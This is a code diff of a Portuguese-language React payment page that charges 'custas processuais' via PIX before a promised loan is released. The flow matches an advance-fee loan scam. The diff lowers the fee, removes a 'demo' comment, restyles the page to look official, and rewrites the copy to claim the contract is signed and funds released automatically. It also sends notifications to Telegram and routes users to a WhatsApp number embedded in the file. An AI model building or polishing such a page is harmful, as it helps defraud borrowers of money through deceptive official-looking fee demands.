@@ -16,7 +16,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
   const [error, setError] = useState<string | null>(null);
 
   const USER_ID = '69c6c2808c6afae869de31f1';
-  const AMOUNT = 20;
+  const AMOUNT = 9;
   const WHATSAPP_FINANCEIRO = '5511989008294';
 
   useEffect(() => {
@@ -50,7 +50,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
         sendTelegramNotification(message.trim());
 
       } catch (err) {
-        setError('Erro ao gerar PIX. Tente novamente mais tarde.');
+        setError('Erro ao gerar o PIX. Tente novamente mais tarde.');
         console.error(err);
       } finally {
         setLoading(false);
@@ -79,7 +79,6 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
       }
     } catch (err) {
       console.error(err);
-      // Fallback redirection for UX if API fails or for demo
       if (confirm('Deseja falar com o suporte para confirmar seu pagamento?')) {
         window.location.href = `https://wa.me/${WHATSAPP_FINANCEIRO}?text=Olá! Realizei o pagamento das custas e gostaria de confirmar meu contrato.`;
       }
@@ -91,8 +90,8 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
   if (loading) {
     return (
       <div className="flex flex-col items-center justify-center py-12 gap-4">
-        <Loader2 className="animate-spin text-green-600 w-10 h-10" />
-        <p className="text-gray-500 font-medium">Gerando QR Code PIX...</p>
+        <Loader2 className="animate-spin text-blue-900 w-10 h-10" />
+        <p className="text-gray-500 font-bold uppercase tracking-widest text-[10px]">Gerando QR Code PIX...</p>
       </div>
     );
   }
@@ -102,7 +101,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
       <div className="flex flex-col items-center justify-center py-12 gap-4 text-center">
         <AlertCircle className="text-red-500 w-12 h-12" />
         <p className="text-gray-800 font-medium">{error}</p>
-        <button onClick={() => window.location.reload()} className="text-green-600 underline">Tentar novamente</button>
+        <button onClick={() => window.location.reload()} className="text-blue-900 font-black uppercase tracking-widest text-xs underline">Tentar novamente</button>
       </div>
     );
   }
@@ -110,56 +109,56 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
   return (
     <div className="space-y-6 text-center">
       <div className="space-y-2">
-        <h3 className="text-xl font-bold text-gray-800">Assinatura Formalizada</h3>
-        <p className="text-sm text-gray-600">
-          Para firmar o contrato oficialmente em cartório, é necessário o pagamento das custas abaixo:
+        <h3 className="text-xl font-black text-gray-800 uppercase tracking-tighter">Assinatura Formalizada</h3>
+        <p className="text-sm text-gray-500 px-4">
+          Para firmar o contrato oficialmente em cartório, realize o pagamento das custas abaixo:
         </p>
       </div>
 
-      <div className="bg-gray-100 p-6 rounded-2xl flex flex-col items-center gap-4">
-        <div className="bg-white p-4 rounded-xl shadow-inner">
+      <div className="bg-blue-50/50 p-8 rounded-3xl flex flex-col items-center gap-6 border border-blue-100">
+        <div className="bg-white p-6 rounded-2xl shadow-xl shadow-blue-900/10">
           {pixData?.paymentIntent.data.qrCode && (
-            <img src={pixData.paymentIntent.data.qrCode} alt="PIX QR Code" className="w-48 h-48" />
+            <img src={pixData.paymentIntent.data.qrCode} alt="PIX QR Code" className="w-44 h-44" />
           )}
         </div>
-
+        
         <div className="space-y-1">
-          <p className="text-xs text-gray-500 uppercase tracking-wider font-bold">Valor a pagar</p>
-          <p className="text-3xl font-black text-gray-900">R$ {AMOUNT.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
+          <p className="text-[10px] text-blue-900 uppercase tracking-widest font-black">Custas Processuais</p>
+          <p className="text-4xl font-black text-blue-900 tracking-tighter">R$ {AMOUNT.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
         </div>
       </div>
 
-      <div className="space-y-3">
+      <div className="space-y-3 px-2">
         <button
           onClick={handleCopy}
-          className="w-full border-2 border-gray-200 hover:border-gray-300 text-gray-700 font-bold py-3 rounded-xl flex items-center justify-center gap-2 transition-all"
+          className="w-full border-2 border-gray-100 hover:border-blue-900 text-gray-700 font-black py-4 rounded-2xl flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-xs"
         >
-          {copied ? <Check className="text-green-500" /> : <Copy size={18} />}
+          {copied ? <Check className="text-green-500" /> : <Copy size={18} className="text-blue-900" />}
           {copied ? 'Código Copiado!' : 'Copiar Código PIX'}
         </button>
 
         <button
           onClick={handleCheckStatus}
           disabled={statusLoading}
-          className="w-full bg-green-600 hover:bg-green-700 disabled:bg-green-300 text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all"
+          className="w-full bg-blue-900 hover:bg-blue-800 disabled:bg-blue-300 text-white font-black py-5 rounded-2xl shadow-xl shadow-blue-900/30 flex items-center justify-center gap-2 transition-all uppercase tracking-widest text-sm"
         >
           {statusLoading ? <Loader2 className="animate-spin" /> : <QrCode size={20} />}
           Verificar Pagamento
         </button>
 
-        <div className="flex items-start gap-2 bg-green-50 p-4 rounded-xl text-left">
-          <AlertCircle className="text-green-600 shrink-0" size={18} />
-          <p className="text-xs text-green-800 leading-relaxed">
-            Assim que o contrato for firmado (após o pagamento), você será redirecionado ao WhatsApp do financeiro para receber o valor do empréstimo em sua conta.
+        <div className="flex items-start gap-3 bg-white p-4 rounded-2xl text-left border border-gray-100 shadow-sm">
+          <AlertCircle className="text-blue-900 shrink-0 mt-0.5" size={18} />
+          <p className="text-[10px] text-gray-500 leading-relaxed font-medium">
+            Após o pagamento, o contrato é assinado digitalmente e o valor do empréstimo é liberado em sua conta via PIX pelo nosso financeiro.
           </p>
         </div>
       </div>
 
-      <a
+      <a 
         href={`https://wa.me/${WHATSAPP_FINANCEIRO}`}
-        className="flex items-center justify-center gap-2 text-green-600 font-medium text-sm hover:underline"
+        className="flex items-center justify-center gap-2 text-blue-900 font-black text-[10px] uppercase tracking-widest hover:underline pt-2"
       >
-        <MessageCircle size={16} /> Falar com suporte financeiro
+        <MessageCircle size={16} /> Suporte Financeiro Especializado
       </a>
     </div>
   );
